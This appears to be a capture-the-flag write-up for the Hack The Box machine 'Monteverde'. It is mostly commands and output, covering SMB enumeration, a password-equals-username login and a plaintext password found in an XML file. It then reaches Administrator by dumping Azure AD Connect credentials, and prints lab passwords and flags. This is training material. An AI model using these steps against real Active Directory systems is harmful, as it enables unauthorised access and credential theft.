# Monteverde

Monteverde was a medium windows box that involved many common windows exploitation techniques and didnt require much to get both the user and root flags

>Skills onvolved in this box:
- enumeration
- smbclient
- CrackMapExec & enum4linux
- windows privelage escalation

# USER

>Nmap
First we start off with an nmap scan and it reveals many ports open but the ones we are interested in are port 139/445 allowing access to smb.
```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-14 07:23:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```

We decide to enumerate further with enum4linux and get a list of users on the box.
```bash 
./enum4linux.pl -a 10.10.10.172
```
 reveals the users:
```bash
MEGABANK\Administrator
MEGABANK\krbtgt
MEGABANK\AAD_987d7f2f57d2
MEGABANK\mhope
MEGABANK\SABatchJobs
MEGABANK\svc-ata
MEGABANK\svc-bexec
MEGABANK\svc-netapp
MEGABANK\dgalanos
MEGABANK\roleary
MEGABANK\smorgan
```
The main user that sticks out here is SABatchJobs.
We then try to logon to the box with smbclient:
`smbclient -L 10.10.10.172 -U SABatchJobs` We try a few guesssing passwords and we manage to login with `SABatchJobs:SABatchJobs`
```bash
kali@kali:~$ smbclient -L 10.10.10.172 -U SABatchJobs
Enter WORKGROUP\SABatchJobs's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        azure_uploads   Disk      
        C$              Disk      Default share
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        users$          Disk      
SMB1 disabled -- no workgroup available
```
We spot the users$ file lets take a look at that:
```bash
kali@kali:~$ smbclient //10.10.10.172/users$ -U SABatchJobs
Enter WORKGROUP\SABatchJobs's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

                524031 blocks of size 4096. 519955 blocks available
smb: \> 
```
We take a look around the users but the only usefull thing we can find is in the dir `mhope`

We find a file called `azure.xml` and we donwload it to our box, we can jsut use `get` or for me i got a timeout error so i mounted it to my box using:
```bash
sudo mount -t cifs //10.10.10.172/users$ /mnt/monteverde -o user=SABatchJobs
```
>azure.xml:
```xml
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>

```
We find the password `4n0therD4y@n0th3r$` lets use this to try login with evil-winrm, we will use the user mhope as that is the user direcotry where we found the xml file
```bash
kali@kali:~$ evil-winrm -u mhope -p 4n0therD4y@n0th3r$ -i 10.10.10.172

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> cd ..
*Evil-WinRM* PS C:\Users\mhope> cd Desktop
*Evil-WinRM* PS C:\Users\mhope\Desktop> ls


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/3/2020   5:48 AM             32 user.txt


*Evil-WinRM* PS C:\Users\mhope\Desktop> type user.txt
4961976bd7d8f4eeb2ce3705e2f212f2
*Evil-WinRM* PS C:\Users\mhope\Desktop>
```
There we go and we get the user flag!

# ROOT

We start by checking permissions for our user `whoami /groups` brings back some interseting results:
```bash
*Evil-WinRM* PS C:\Users\mhope\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group

```
`MEGABANK\Azure Admins` seems to be usefull somehow, after a google search we find a priv esc tool called `AzureADConnect` which spits out the admin creds for the box, so we try and utilise this. https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1 <-- for the tool 

```bash
*Evil-WinRM* PS C:\Users\mhope\Desktop> import module ./AzureADConnect.ps1 <-- from our box
*Evil-WinRM* PS C:\Users\mhope\Desktop> AzureADConnect -server 127.0.0.1 -db ADSync
[+] Domain:  MEGABANK.LOCAL
[+] Username: Administrator
[+] Password: d0m@in4dminyeah!
```
Great now we have creds for the administrator lets log in and grab the root flag!
```bash
kali@kali:~/boxes/monteverde$ evil-winrm -u Administrator -p d0m@in4dminyeah! -i 10.10.10.172

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint


*Evil-WinRM* PS C:\Users\Administrator\Documents> 
cd*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/3/2020   5:48 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
12909612d25c8dcf6e5a07d1a804a0bc
```
Thanks for reading hope you enjoyed!

